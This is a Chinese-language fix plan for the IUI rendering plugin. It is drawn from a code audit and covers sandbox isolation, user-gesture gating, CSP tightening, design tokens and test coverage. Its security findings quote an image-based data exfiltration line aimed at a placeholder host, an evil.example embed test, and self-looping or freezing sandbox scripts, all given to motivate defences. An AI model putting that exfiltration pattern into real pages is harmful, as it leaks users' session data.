# IUI 完整修复方案

> 适用版本：`@losebird/iui` 0.13.0-iui.26 ｜ 仓库：losebird/IUI
> 依据：代码审计 + 本地复现（tsc / vitest / Playwright）+ 两个原型验证
> 目标：先修好会让页面直接坏掉的问题，再补安全和隐私，最后改体验和工程质量

---

## 0. 总览

| 编号 | 问题 | 级别 | 状态 | 阶段 |
|---|---|---|---|---|
| F1 | 作者 JS 分块后顶层 `const/let/class` 跨块不可见 | P0 | 已复现 + 原型修复通过 | Phase 0 |
| F2 | `installNullSafeQuery` 全局篡改 DOM API，重跑时 CDN 库被误判 | P0 | 已复现 | Phase 0 |
| F3 | 内部事件 / `sendPrompt` 被当成用户动作发给模型，可自循环 | P0 | 代码确认 + 手势原型通过 | Phase 0 |
| F9 | 重新生成提示词写死“旅行行程卡” | P1 | 代码确认 | Phase 0 |
| F14 | `tsc` 13 个错误（primitives 版本不匹配） | P0（构建） | 已复现 | Phase 0 |
| F4 | 绑定数据跨会话泄露 + 接口无鉴权 | 安全 | 代码确认 | Phase 1 |
| F5 | 地图组件正则白名单可嵌入任意 https 页面 | 安全 | 代码确认 | Phase 1 |
| F6 | `allow-modals` + 死循环无看门狗，可卡死标签页 | 安全/稳定 | 代码确认 | Phase 1 |
| F7 | 普通 JSON 代码块被误渲染为页面 | 功能 | 代码确认 | Phase 1 |
| F8 | 净化器破坏空白、拦截 data: 图片、CSS 留残引号 | 功能 | 已复现 | Phase 1 |
| F10 | 状态持久化只在内存，恢复不触发事件 | 体验 | 代码确认 | Phase 2 |
| F11 | 全屏实现不完整 | 体验 | 代码确认 | Phase 2 |
| F12 | 实景图与地点不匹配，署名冗余 | 体验 | 截图确认 | Phase 2 |
| F13 | 测量 / 轮询 / CDN 加载的性能问题 | 性能 | 代码确认 | Phase 2 |
| D | 设计与交互改进 | 体验 | 评审意见 | Phase 2 |
| F15 | 回归测试缺口，README 测试失败 | 工程 | 已复现 | Phase 3（README 测试放到 Phase 0） |
| F16 | 遗留 `iui`/`dsh-ui`/`svg` fence 仍注册 | 工程 | 代码确认 | Phase 3 |
| F17 | 其它小问题 | 杂项 | 代码确认 | Phase 3 |

**版本节奏建议（v2，已按国内可用性优先调整）**

- **0.13.0-iui.27（热修，约 2–3 天）**：F1、F2、F3、F9、F14，加 README 测试修复
- **0.13.0-iui.28（国内可用 + 安全，约 5–6 天）**：**F19 国内网络**、**F18 桥接能力（存储 / 下载 / 复制）**、F4、F5、F6、F7、F8
- **0.14.0（体验，约 2 周）**：F10–F13、D（字号阶梯、页面性格、来源信息）、F21–F23
- **0.15（能力）**：F20 离线导出、F24 原地迭代与版本、F25 截图评分
- **持续（清理）**：F15、F16、F17，加 CI

> F18–F25 是根据第二轮反馈新增的，见文末“补充章节”。

---

## Phase 0 · 热修

### F1 作者 JS 跨块作用域丢失（P0）

**现象**
`splitAuthorJsChunks` 把作者脚本切成多块，`runChunkList` 对每块执行 `(0, eval)(part)`。间接 eval 里的顶层 `const` / `let` / `class` 只在**这一次** eval 的词法环境里有效，所以后面的块会报 `ReferenceError`。复现：一个 7 块的脚本，第 2 块起全部报错，页面一直停在 init。

原型对照（Node，语义与浏览器一致）：

```
(0,eval)('const Q=1'); (0,eval)('globalThis.q=Q')  →  ReferenceError: Q is not defined
```

预览路径 `runAuthorJs` 和最终 srcdoc 路径（`buildHtmlSandboxSrcdoc` 约 L2612）都受影响。

**修复**

1. **默认整段执行**：先用 `new Function(src)` 检查语法。语法没问题就只执行一次 `(0, eval)(src)`，不再切块。
2. **只在 SyntaxError 时才分块兜底**：分块之前先跑 `hoistTopLevelLexical(src)`，把顶层声明改写成能跨块共享的形式：
   - 顶层 `const x` / `let x` → `var x`（用等长空格补齐，列号不变，错误定位不受影响）
   - 顶层 `class X {…}` → `var X = class X {…}`
   - 字符串、模板字符串（含 `${}` 嵌套）、注释和非顶层位置一律不动
   - 复用 `scanTopLevel` 的扫描状态机（需要把它从 `author-js-runtime.ts` 导出，或者改为接收回调）
3. **错误上报**：失败条带显示块号和该块的前 120 个字符，同时传给 F9 的修复提示词。
4. **提示词兜底**：SKILL / system prompt 加一句“跨 `<script>` 共享的变量请用 `var` 或挂到 `window` 上”。

**原型验证（已通过）**：`/data/proto/hoist.mjs`。用例包括模板字符串插值、类方法里的局部 `const`、函数里的 `let`、字符串里的 `"const no"`、注释里的 `// let x`。提升之后分 3 块执行，结果为 `[1,'1',2,3,'const no']`：只改了顶层声明，局部声明、字符串和注释都没变。

**伪代码（runtime 内）**

```js
function runAuthor(src, exprs) {
  var parts;
  try { new Function(src); parts = [src]; }
  catch (e) { parts = splitAuthorJsChunks(hoistTopLevelLexical(src)); }
  return runChunkList(parts, exprs);
}
```

**验收**
- 跨块使用 `const` / `let` / `class` 的 7 块脚本能完整运行，`authorSettled.ok === true`
- 只有一块语法错误时，其余块照常执行，而且能引用其它块的顶层声明
- 新增 vitest：hoist 单测 ≥ 10 个用例；Playwright：srcdoc 端到端 1 个用例

**风险**：`const` 改成 `var` 后可以被重新赋值，也会挂到 `window` 上，但这只发生在兜底路径，可以接受。`let` 的暂时性死区语义会丢失，属于极端情况。

---

### F2 删除 `installNullSafeQuery`（P0）

**现象**
它永久改写 `Document.prototype.querySelector`、`Element.prototype.querySelector` 和 `document.getElementById`，找不到元素时返回 `NULL_NODE`，导致：
- 作者代码里的“元素是否存在”判断永远为真，逻辑出错，而且没有任何报错
- 选择器里含 `img` 时，会往页面里插入多余的 `<img data-iui-live-img>`
- **重跑时连锁故障（已复现）**：`wantsLeaflet` / `wantsAgGrid` / `ensureScript` / `ensureCss` 自己也用被篡改的 `document.querySelector`，结果误以为脚本已存在。每个库要空等 125×40ms 两轮，20–40 秒后才显示“Leaflet CDN 加载失败 / 全局 L 未就绪 / AG Grid CDN 加载失败”

**修复**

1. 删除 `installNullSafeQuery`、`NULL_NODE` 和 `ensureLiveImg`。
2. bridge 启动时先保存原生 API（`var $q = Document.prototype.querySelector.bind(document)` 等），宿主侧辅助函数一律使用保存下来的版本，不受作者代码影响。
3. 用友好的提示代替静默吞错：捕获到 `Cannot read properties of null` / `null is not an object` 时，失败条带显示“页面脚本找不到某个元素”，并尽量从堆栈附近的源码里解析出选择器。
4. 可选：提供 `iuiSandbox.$(sel)`，元素不存在时返回 `null` 并打一条 warn，在提示词里推荐使用。
5. 重跑前清理：`[data-iui-live-img]` 残留节点、计时器（追踪 `setInterval` / `setTimeout` id）、`withDomReplay` 登记的监听器。

**验收**
- 点击“重跑”后，Leaflet / AG Grid 页面在 2 秒内恢复正常，没有误报失败条带
- `document.querySelector('#nope')` 返回 `null`
- 新增 Playwright 用例：同一页面重跑 3 次，DOM 节点数稳定，无失败条带

---

### F3 动作通道：内部事件隔离 + 用户手势门控（P0）

**现象**
`sendInlineGenuiAction`（`src/client/index.tsx` 约 L135）把**所有** `onAction` 都包装成 `[genui-action]` 消息发给模型。html-fence 对 `sandbox_rerun_author_js`、`sandbox_reask`（还会往输入框插入内容）、`sandbox_send_prompt`（会直接自动发送）这类内部事件也调用 `onAction`。沙箱里的 `iuiSandbox.action` 既不检查用户手势，也不限频，页面脚本可以不停地自己给模型发消息，形成自循环，白白消耗 token。

**修复**

1. **内部事件不再外发**：`sandbox_*` 前缀的事件只在宿主内部处理，`sendInlineGenuiAction` 与 dom-fence relay 用同一个过滤器拦截：
   ```ts
   const INTERNAL = /^sandbox_/;
   if (INTERNAL.test(action.type)) return handleInternal(action);
   ```
2. **`sendPrompt` 默认只填入输入框**，由用户自己点发送。如果确实需要自动发送，必须同时满足下面第 3 条和第 4 条。
3. **用户手势门控**：宿主收到 `action` / `sendPrompt` 消息时检查 `navigator.userActivation.isActive`。
   - **原型验证（已通过）**：`/data/proto/ua.mjs`。在 `sandbox="allow-scripts"` 的 srcdoc iframe 里点击后发 postMessage，宿主读到 `isActive === true`；页面加载 6 秒后脚本自己发的消息读到 `false`。Chromium 的 UAv2 会把 iframe 里的激活状态传到父页面，所以宿主侧门控可行。
   - 不支持 `userActivation` 的浏览器退回到确认对话（“页面想发送消息给助手：…… [发送] [取消]”）。
4. **限频和断路**：每个 frame 每 2 秒最多 1 次，每个会话每分钟最多 6 次。超过上限就暂停该 frame 的外发，并显示“此页面发送过于频繁，已暂停 · 恢复”。
5. **内容约束**：外发消息长度 ≤ 2000 字符，并附上来源标记 `[来自页面: <标题>]`，方便模型和用户分辨。

**补充说明**：用户点击后有约 5 秒的激活窗口，单靠手势门控挡不住“点一下、连发多次”，所以必须叠加第 4 条限频。

**验收**
- 页面里写 `setInterval(()=>iuiSandbox.action({type:'x'}),100)`，模型收到 0 条消息
- 真实点击按钮，消息正常发出
- “重跑”和“重新生成”不再产生 `[genui-action]` 消息

---

### F9 通用的“重新生成 / 让模型修复”提示词（P1）

**现象**
`zh.ts` 约 L370 写死了“行程卡必须带 Wikimedia 实景图与署名”（`en.ts` 约 L375 同理），而且不带任何错误信息，模型只能盲修。

**修复**：改成模板，内容由失败条带收集：

```
刚才的 iui-html 页面运行出错，请修复后用 ```iui-html 完整重新输出：
- 错误类型：{kind}（author / host / cdn）
- 错误信息：{message}
- 位置：第 {index}/{total} 段脚本
- 相关片段：
{snippet ≤ 1500 字符}
{tripClause}
```

- `{tripClause}` 只在原页面里有行程标记（如 `data-iui-trip` 或 Wikimedia 图片）时才加上
- 中英文模板都放进 i18n，删掉写死的旅行文案

**验收**：非旅行页面点“重新生成”时，提示词里不出现“行程卡”，并且包含错误信息。

---

### F14 修复 TypeScript 构建（P0 · 构建）

**现象**：`tsc` 报 13 个错误。`src/client/settings/IuiSettingsSection.tsx` 和 `settings/index.ts` 引用了 `SettingsForm`、`SettingsFormModel`、`Switch`、`settingsTextField`、`SettingsFormScope`，而锁定的 `@deepseek-ai/dsh-client-ui-primitives@0.1.2-rc.1` 里没有这些导出。peer 范围允许装到旧版宿主，运行时可能直接崩溃。

**修复（二选一，推荐 A）**
- **A**：devDependency 升到包含这些导出的 primitives 版本，同时把 `peerDependencies` 的最低版本提到同一版本，`check` 脚本里加 `tsc --noEmit`
- **B**：做特性检测，如 `if (!primitives.SettingsForm) return <LegacySettings/>`，并补上类型声明

**验收**：`pnpm tsc --noEmit` 0 错误；在旧宿主上能看到清晰的“需要宿主 ≥ x.y”提示，而不是白屏。

### F15a 修复 README 测试（Phase 0 顺手做）
`tests/p1-remaining-12.spec.ts` 期望 README 里匹配 `/sandbox|沙箱/`。可以在 README 里补一段“安全沙箱说明”（正好配合 F4–F6 的安全说明），或者改断言。推荐补文档。

---

## Phase 1 · 安全与正确性

### F4 绑定数据隔离 + 接口鉴权

**现象**
- `setBindingSessionHint` 从来没有被调用，客户端拉取的是“最近一个 / 全部会话”的 bindings（`bindings.json` 回退到 `getLatestSnapshot`，SSE 也没有按会话过滤）
- 全局 map 从不清空，而且会推送给**每一个**沙箱 frame
- CSP `img-src https: data: blob:` 允许 `new Image().src='https://x/?d='+data` 把数据外传
- 服务端接口（`src/plugin/index.ts` 约 L202–255）收到任何 session id 都照单全收，不做鉴权

**修复**
1. 在 `src/client/session-resolver.ts` 拿到当前会话后调用 `setBindingSessionHint(sessionId)`；切换会话时清空 map 并重新订阅。
2. 服务端：`session` 参数改为必填；删掉 latest 回退；只监听 127.0.0.1，或校验宿主下发的 token。
3. 按需推送：只给“属于当前会话、并且源码里用到 `$bind` / `iuiSandbox.appData` / `data-iui-bind`”的 frame 推送 appData。
4. 设置项“严格图片策略”：开启后 `img-src` 只允许 `data: blob:` 和白名单图床（Wikimedia 等），关闭后保持现状。默认值建议在 0.14 改为开启。
5. 在 README 里写清楚威胁模型：页面脚本能读到哪些数据。

**验收**：A、B 两个会话互相看不到对方的绑定数据；不带 session 参数请求接口返回 400。

### F5 地图嵌入白名单收紧

**现象**：`safeEmbedUrl`（`src/client/blocks/advanced.tsx` 约 L639）用正则 `/(map|maps|osm|leaflet)/` 兜底，任何 URL 里带这些词的 https 页面都会被嵌入，而且 iframe 带 `allow-scripts allow-same-origin allow-popups allow-popups-to-escape-sandbox`。

**修复**
- 删掉正则兜底，只保留精确的主机白名单：`www.openstreetmap.org`、`maps.google.com` / `www.google.com/maps/embed`、`uri.amap.com`、`map.baidu.com` 等
- 删掉 `allow-popups-to-escape-sandbox`；只有已知 provider 才保留 `allow-same-origin`
- 不在白名单里的 URL 显示为普通外链卡片

**验收**：`https://evil.example/maps/x` 不会被嵌入。

### F6 弹窗与死循环防护

**修复**
1. iframe 去掉 `allow-modals`；在 bridge 里把 `alert` / `confirm` / `prompt` 替换为页面内 toast（`confirm` 返回 `false`，`prompt` 返回 `null`，并在控制台提示改用页面内 UI）。
2. **看门狗**：bridge 每 1 秒向宿主发一次心跳；宿主连续 5 秒没收到心跳，就把 frame 标记为“页面无响应”，显示遮罩和 [停止] [重新加载]。[停止] 会把 srcdoc 换成空页面，结束其中的脚本。
3. 确认 Chromium 下 sandboxed srcdoc 是否进程隔离（`--site-per-process` 加不透明 origin）。如果和宿主在同一个进程，`while(true)` 仍然会卡住宿主，长期方案是把沙箱放到独立 origin，例如 `iui-sandbox.localhost`，强制进程隔离。

**验收**：`alert` 循环不再弹出系统对话框；`while(true){}` 页面在 5 秒内显示“无响应”，宿主依然能操作（需要进程隔离成立）。

### F7 严格判定“页面型 JSON”

**现象**：`looksLikeHtmlSandboxBody`（`src/shared/genui-shape.ts` L27）只要发现 ```json 或无语言代码块以 `{` 开头、并且有 `html` / `css` / `js` 字段，就会当成页面渲染，代码被隐藏。

**修复**
- 白名单字段：只允许 `{html, css, js, title, height, libs}`，出现其它字段就不渲染
- `html` 里必须含有标签（`/<[a-z][\s\S]*>/i`）
- 只对 assistant 已经结束输出的消息生效
- `json` / 无语言代码块**不再自动渲染**，改为在代码块右上角显示“▶ 渲染为页面”按钮；只有 `iui-html` fence 才自动渲染

**验收**：用户粘贴或模型输出的普通配置 JSON 照常以代码块显示。

### F8 净化器修正

**已复现**：`"a\n b"` 被改成 `"a b"`；`<img src="data:image/png…">` 被拦截；`sanitizeSandboxCss` 把 `url("data:…")` 改成了 `url(blocked:…")`，留下一个多余的引号，导致后面的 CSS 全部失效。

**修复**
- 删掉文本层面的空白处理；如果确实需要，只在 `pre` / `code` / `textarea` / `script` / `style` 之外的文本节点上做
- `img src` 和 CSS 允许 `data:image/(png|jpeg|gif|webp|svg+xml)`，单个上限 1MB
- 被拦截的 URL 整体替换为 `url(about:invalid)`，保证 CSS 语法不被破坏
- 新增单测：空白保留、data 图片、CSS 拦截后其余规则依然生效

---

## Phase 2 · 体验与性能

### F10 状态持久化
- **现状**：localStorage shim 只存在内存里；`localStateByFence` 是模块级 Map，没有上限，用原始 body 当 key，可能冲突；只能捕获表单字段、aria 属性和写死的 `#pause` / `#status` / `#replay`；恢复后不触发事件。
- **方案**：
  - 用宿主桥接做持久化：存在宿主 IndexedDB 里，命名空间为 `iui:state:<sessionId>:<stableKey>`，`stableKey` 取 dom-fence 的 context key 加 fence 序号
  - 每个页面配额 256KB
  - author JS 运行前先发 `storageInit`，最多等 300ms；之后的写入通过 `storageSet` 防抖 300ms 同步
  - 恢复表单值后派发 `input` / `change` 事件，让作者代码里的监听器同步状态
  - `localStateByFence` 改为 LRU（上限 50 项）
- **验收**：刷新页面或切换会话后回来，计数器、表单、勾选状态都还在。

### F11 全屏
- 通过 portal 挂到 `document.body`，避开祖先元素的 `transform`
- iframe 高度设为 `100vh`，减去工具栏高度
- 支持 Esc 退出，打开时锁定背景滚动，退出后焦点回到全屏按钮
- 有条件时调用 `requestFullscreen()`

### F12 实景图准确性
- **问题**：截图里，“Seesaw 安福路”配的是汉口法租界界碑，“Manner 愚园路”配的是静安寺
- **方案**：
  - 加置信度判断：图片标题和地点名匹配，或者用经纬度通过 Wikipedia geosearch 找到 300 米以内的条目，满足其一才使用这张图
  - 都不满足就不放图，改用统一的占位样式（类别图标加主色背景）
  - 署名统一折叠为“ⓘ 图片来自 Wikimedia”，悬停时显示作者和许可协议；不再显示原始文件名，也不再重复写 “Wikimedia”

### F13 性能
- bridge 的 MutationObserver 只监听 `childList` + `characterData`，再配合 `ResizeObserver(document.documentElement)`
- 测量合并到同一个 rAF；高度变化 ≥ 2px 才 postMessage；去掉对每个子元素调用 `getComputedStyle`
- bindings 改为懒启动：页面里有 bind 引用才开始监听；以 SSE 为主，SSE 断开时才退回 2.5s 轮询；没有页面时停掉 1s 的 hint 定时器
- CDN 库并行加载（Leaflet JS 和 CSS、Chart、AG Grid 同时请求），各自等待对应的全局变量就绪
- **验收**：空闲页面每秒的 postMessage 次数接近 0；带 3 个库的页面首屏时间缩短 ≥ 40%

### D 设计与交互改进（来自 UI/UX 评审）
1. **字号体系**：12 / 14 / 16 / 20 / 28 / 40，写进 SKILL 模板；format referee 检查最小字号 ≥ 12px、正文对比度 ≥ 4.5:1
2. **页面风格预设**：简洁 / 杂志 / 数据看板 / 活泼，每种配一套主色变量，避免所有页面长得一样
3. **数字层级**：大数字加小标签的统一组件，单位缩小并降低不透明度
4. **横向滚动提示**：两侧渐隐遮罩加滚动指示
5. **卡片对齐**：等高网格；标题限制 2 行，摘要限制 3 行
6. **地图标记防重叠**：标记聚合或偏移，标签避让
7. **3D 模板**：更好的默认光照、相机和控制器，配加载占位
8. **代码块**：自动换行开关和复制按钮
9. **工具栏精简**：只保留“全屏”和“⋯”菜单；“重跑”只在出错时出现在失败条带里
10. **流式输出骨架屏**：生成过程中显示骨架屏和进度，不再空白闪烁
11. **CDN 镜像配置**：可以设置国内 CDN 镜像和国内地图瓦片源（高德 / 天地图）
12. **导出**：导出 HTML 时把依赖内联，离线也能打开
13. **文案**：“模型作者 JS”改成“页面脚本”

---

## Phase 3 · 工程清理

### F15 测试补齐
| 范围 | 用例 |
|---|---|
| author JS | 跨块 const/let/class、语法错误分块兜底、hoist 不改字符串/注释/模板 |
| 重跑 | 3 次重跑 DOM 稳定、CDN 库不误判、计时器已清理 |
| 动作通道 | 无手势不外发、限频、`sandbox_*` 不外发 |
| 绑定 | 会话隔离、无 session 返回 400 |
| 净化器 | 空白、data 图片、CSS 拦截后语法依然有效 |
| shape | 普通 JSON 不被渲染 |
| 构建 | `tsc --noEmit`、`pnpm build` |

**CI**：GitHub Actions 依次跑 `pnpm i --frozen-lockfile` → `tsc --noEmit` → `vitest run` → `playwright test`（只跑 chromium）。

### F16 遗留 fence
- 新增 `legacyFences` 配置，默认关闭；关闭时不再注册 `iui` / `dsh-ui` JSON fence 和 GenuiBlock
- `svg` fence 只接管带 `data-iui` 标记或来自 iui 技能的输出，其它 ```svg 照常显示为代码；或者默认显示源码，提供“预览”切换
- 0.13 标记为 deprecated，0.14 删除；同步更新 ARCHITECTURE.md

### F17 杂项
- 失败条带的语言跟随插件 i18n，而不是 `navigator.language`
- 错误只显示一处：有 in-frame 条带时，宿主不再显示 ErrorState
- `downloadText`：延迟 `revokeObjectURL`（`setTimeout` 1 秒），避免部分浏览器下载失败
- 注释写的是 Carto，代码用的是 Esri，统一一下
- 可选的 Jev 路由会把提示词发给第三方：在设置页和 README 里写明，并且默认关闭
- `frameId` 改用 `crypto.randomUUID()`，替代 React `useId`；宿主校验 `event.source === iframe.contentWindow`，防止相邻 frame 伪造消息

---

## 附录 A · 原型与复现脚本

| 文件 | 内容 |
|---|---|
| `/data/proto/hoist.mjs` + `test.mjs` | F1 顶层声明提升原型和测试（已通过） |
| `/data/proto/ua.mjs` | F3 跨 iframe 用户激活验证（已通过：点击为 true，自动发送为 false） |
| `/tmp/t1.mts` `/tmp/t2.mts` `/tmp/t3run.mjs` `/tmp/t4.mts` | 审计阶段的复现脚本（分块、净化器、重跑、shape） |

## 附录 B · 工作量估计

| 阶段 | 内容 | 估计 |
|---|---|---|
| Phase 0 | F1 F2 F3 F9 F14 + README | 2–3 人日 |
| Phase 1 | F4 F5 F6 F7 F8 | 3–4 人日 |
| Phase 2 | F10–F13 + D | 6–10 人日 |
| Phase 3 | F15 F16 F17 + CI | 2–3 人日 |

## 附录 C · 风险
- **F3 手势门控**：依赖 UAv2。Safari 16.4+ 和 Firefox 支持 `navigator.userActivation`，旧浏览器走确认对话兜底
- **F6 进程隔离**：同进程时死循环依然会卡住宿主，需要沙箱独立 origin，可能需要宿主（dsh）配合
- **F4 鉴权**：取决于宿主是否提供插件 token；如果没有，至少要限制只监听 localhost 并且 session 必填
- **F7 / F16 兼容性**：老对话里的 json 页面不再自动渲染；可以加一个“兼容模式”开关过渡


---

## 补充章节 · 第二轮反馈（F18–F25 + D 补充）

### 核对结论（对照代码）
| 推断 | 结论 |
|---|---|
| html 沙箱只有 `allow-scripts` | **基本属实**：`html-fence.tsx` L727 为 `sandbox="allow-scripts allow-modals"`，没有 popups / forms / downloads，也没有同源 |
| 存储用不了 | **部分属实**：有 localStorage shim，但只存在内存里，刷新后丢失（见 F10） |
| 下载 / 复制 / 打开链接 | 桥接里只有 `sendPrompt` / `openLink` / `action` 三个方法。**openLink 已有**；页面内下载和复制**没有**宿主代办 |
| 依赖走海外 CDN | **属实**：jsdelivr（Leaflet / Chart / AG Grid / Mermaid / ECharts）、esm.sh（three / gsap / d3 / chart.js）、unpkg；瓦片用 OSM / Esri，图片来自 Wikimedia；没有镜像配置 |
| 导出不独立 | **属实**：工具栏“下载”用的是 `buildSandboxDownloadHtml` 加实时快照，CDN 和图片依然是外链 |
| 高度写死 | **不属实**：已有自动高度回传，上限 2400px（`clampHeight`）；但没有窄屏断点规则 |
| 减少动态效果 | 宿主自身的 CSS 已遵守 `prefers-reduced-motion`；沙箱页面的设计系统和模板**没有要求**，也没有焦点样式规范 |

### F18 宿主代办桥接能力（Phase 1）
- 新增以下接口，全部走 postMessage，并做用户手势校验（复用 F3）：
  - `iuiSandbox.storage.get/set/remove/keys`：等同 F10 的持久化存储，提前到 Phase 1 交付最小版本
  - `iuiSandbox.download(filename, content | Blob, mime)`：由宿主创建 Blob 并触发下载，单个文件 ≤ 10MB
  - `iuiSandbox.copy(text)`：由宿主写入剪贴板，失败时弹 toast
- 表单：bridge 拦截 `submit` 事件，调用 `preventDefault()`，再派发 `iui:submit`；设计系统写明“不要依赖表单提交跳转”。实现前先在 Chromium 里确认没有 `allow-forms` 时 `submit` 事件是否还会触发
- 拦截 `<a download>` 和 `blob:` 链接点击，自动改走 `iuiSandbox.download`
- 在 SKILL / 设计系统文档里列出“沙箱能力表”：能用什么、该用哪个替代接口

### F19 国内网络可用性（Phase 1，最高优先级）

> 第四轮已细化为 C1–C11 专项方案（见文末），以文末为准。
- **可配置 CDN**：设置项 `cdnPreset = global | china | local | custom`
  - `china`：jsdelivr / unpkg 换成 `npmmirror` / `staticfile` / `bootcdn` 对应路径，esm.sh 换成国内镜像或自建
  - `local`：插件随包附带 vendor（leaflet、chart.js、three、gsap、d3、mermaid、echarts，按需），由插件本地服务提供，**最稳**
  - 统一用 URL 映射表 `resolveLib(name, version)`，设计系统里的 import map 也从这张表生成
- **地图瓦片**：增加高德 / 天地图（需要 key）；注意 **GCJ-02 坐标偏移**，模型给的 WGS-84 坐标要在宿主侧转换后再落点
- **图片**：Wikimedia 加载失败时退回到 F12 的占位样式；可选配置图片代理
- **失败提示**：每个库加载超时 8 秒，失败条带写明“××库加载失败（可能是网络原因），可在设置里切换国内源”，并附上 [切换并重试] 按钮，不再白屏
- **验收**：在屏蔽 jsdelivr / esm.sh / unpkg 的网络下，选 `china` 或 `local` 后，地图、图表、3D 示例都能正常显示

### F20 真正独立的离线导出（0.15）
- 导出时提供“内嵌依赖和图片”选项：宿主抓取脚本、CSS 和图片，内联成 `<script>`、`data:` URI；地图瓦片无法内联，导出版显示静态截图兜底
- 体积上限约 15MB，超出时提示，并退回外链版本

### F21 流式生成体验（0.14）
- 拿到 fence 头部的 title / height 后立即渲染骨架屏，并显示“正在生成 · 已写 N 行”
- 两段式渲染：`</style>` 和 html 部分写完后先渲染静态页面（不执行 JS），js 结束后再激活交互；冻结的预览 iframe 只更新 DOM，不整页重载

### F22 宽度与窄屏适配（0.14）
- 自动高度保留现有逻辑，超过 2400px 时才在页面内滚动，并显示“展开全部”
- 设计系统加断点规则：≤ 480px 单列、≤ 720px 两列，网格用 `minmax()`
- format referee 用 360 / 720px 两种宽度渲染，检查是否出现横向溢出

### F23 无障碍与动效（0.14）
- 设计系统 base CSS 加入 `:focus-visible` 焦点环和 `prefers-reduced-motion` 全局降级（关闭动画和过渡）
- 交互元素最小点击区域 32px；主操作按钮使用主色，放在显眼的位置（截图里“上一步 / 下一步”太小，而且贴在左下角）
- 模板全部检查一遍键盘可达性

### F24 原地迭代与版本（0.15）
- 新增 ```iui-patch fence：针对上一版页面给出 CSS / DOM / JS 局部修改，宿主合并后生成新版本；patch 合并失败时退回整页重写
- 同一个页面的多个版本显示为“v1 · v2 · v3”切换，状态存储按 stableKey 继承
- 提示词里附上当前版本源码（截断）和“请只输出修改”的指引

### F25 按真实效果评分（0.15）
- 黄金回归集增加截图检查（Playwright）：最小字号、文字对比度、横向溢出、大面积空白（空白像素占比）、是否有视觉主角（最大元素面积占比）、窄屏表现
- 每条规则单独打分，汇总进 CI 报告；分数下降超过阈值时标红

### D 补充（截图问题 → 设计系统）
- **页面性格预设**：工具型 / 内容型 / 数据型 / 玩具型，每种规定主色、背景、圆角、密度，以及“一个视觉主角”的规则
- **地图**：默认用彩色底图；标记按类别着色并带编号，选中项放大高亮；同时做 D6 的防重叠
- **数字和标签**：强制上下两层结构（大号数字在上，小号说明在下），格式审查器检查数字和说明之间有没有分隔
- **来源信息**：原始文件名永远不显示（F12）
- **模板**：优先重做 3D 场景（物体占画面 ≥ 40%，配三点光源和阴影）和会议室看板；每个模板必须通过 F25 评分才能入库

---

## 第三轮 · 品味与易用性深挖（G1–G16）

> 本轮全部基于代码核对。核心结论：**截图里的“灰、平、像 AI 默认风格”，很大一部分是提示词和令牌本身规定出来的**，不只是模型发挥不好。所以要先改规则，后面的评分和审查才有意义。

### 一、品味的根因在规则层

#### G1 设计规范里有诱导平庸、互相矛盾的硬规则（优先级最高，改动成本最低）
`src/themes/oiu-design-system.ts` 中的 `OIU_DESIGN_SKILL`：

| 现有规则 | 后果 | 改为 |
|---|---|---|
| 地图 “REAL Leaflet … height 300px, **grayscale**”；瓦片 “Esri … **grayscale via CSS**（REQUIRED）” | 截图里的灰地图就是这条规则规定的 | 默认彩色、低饱和底图；页面主色作为标记色；灰度只作为可选风格 |
| “ALWAYS use CSS variables — **never hardcode hex**”，而令牌里唯一的强调色是 info 蓝 | 所有页面都是灰白加一点蓝 | 新增 `--accent-*` 系列（见 G2），允许每个页面声明一个主色 |
| 照片 “REQUIRED on every … card”，同时 “**NEVER use solid muted blocks as photo stand-ins**” | 逼着模型和宿主硬配图，导致错图（F12） | 没有可信图片时，用设计过的占位（类别图标 + 主色渐变），并且明确允许这样做 |
| 三列定价 / 看板 “**NEVER stack** … keeps 3 columns down to ~480px” | 窄屏挤坏（F22） | ≤ 520px 时改成横滑或单列堆叠 |
| “Lock **DENSITY**”、天气 “NEVER ship a thin 3-KPI strip” | 页面过满，没有留白和主角 | 改为“一屏一个主角，信息分 3 级”；密度靠层级来组织，不靠堆砌 |
| 设计规范一半篇幅是行程 / 天气 / 酒店 | 非旅行页面缺少可参考的模式 | 行程类改为按意图注入（G6），常驻部分只保留通用版式原则（G5） |

**验收**：同一组 10 个提示词，改前改后截图对比，F25 打分中“视觉主角”和“色彩区分度”两项明显提升。

#### G2 令牌体系补全并修正对比度
- **对比度问题（已计算）**：
  - `--color-text-tertiary #9c9a92` 在白底上只有 **2.82:1**，在 secondary 背景上只有 2.61:1
  - 深色模式下 `--color-text-secondary #73726c` 在 `#1a1a18` 上只有 **3.61:1**
  - 都达不到 WCAG AA 的 4.5:1
  - **改法**：tertiary 只用于装饰和禁用态；正文类文字最浅用 secondary；深色模式的 secondary 调到约 `#a3a19a`（≥ 5:1）
- **新增令牌**：
  - **字号**：`--text-xs 12 / sm 14 / base 16 / lg 20 / xl 28 / 2xl 40`，行高中文 1.65、英文 1.5、标题 1.25
  - **间距**：`--space-1..8`，按 4/8pt 网格
  - **阴影**：`--shadow-1..3`；目前只有一个 `--iui-pack-elev`，几乎看不出来
  - **主色**：`--accent`、`--accent-soft`、`--accent-strong`、`--on-accent`。fence JSON 新增可选字段 `"accent":"#E4572E"`，宿主用已有的 `src/themes/color-utils.ts` 生成一整套色阶，并自动保证对比度
- **中文字体与数字**：
  - `--font-sans` 补上 `"PingFang SC","Hiragino Sans GB","Microsoft YaHei","Noto Sans SC"`；目前只有 `system-ui`，在部分 Windows 和 Linux 环境下中文会回退到宋体
  - 数字统一用 `font-variant-numeric: tabular-nums`，KPI、价格、表格的数字才能对齐

#### G3 第三方库没有统一主题（已确认）
- `window.iuiCreateChart`（`html-sandbox.ts` 约 L2331）只处理 NaN 和高度，**没有设置 `Chart.defaults`**，字体、颜色、网格线、配色都是 Chart.js 默认值。深色模式下坐标轴文字是深灰色，几乎看不见；天气模板里还写死了 `#185FA5`
- **改法**：
  - bridge 注入后设置 `Chart.defaults.font.family/size`、`color`、`borderColor`（网格线用 border-tertiary）、tooltip 样式，以及从 `--accent` 和 `.c-*` 生成的 8 色调色板
  - 收到 theme 消息时重新应用设置，并调用 `chart.update()`
  - ECharts 用 `registerTheme('iui')`；Leaflet 的标记、弹窗和控件也套用令牌（Mermaid 和 AG Grid 已经接入，保持不变）

#### G4 图标体系
- 目前没有图标系统，模型只能用 emoji 或手画 SVG，风格不统一，这也是“像 AI 默认风格”的原因之一
- **改法**：随插件附带约 60 个 Lucide 图标的 SVG sprite（本地文件，不走 CDN，也顺带符合 F19），用法为 `<svg class="iui-icon"><use href="#i-map-pin"/></svg>` 或 `<i data-iui-icon="map-pin">`。规范写明：界面图标不用 emoji，内容里可以用

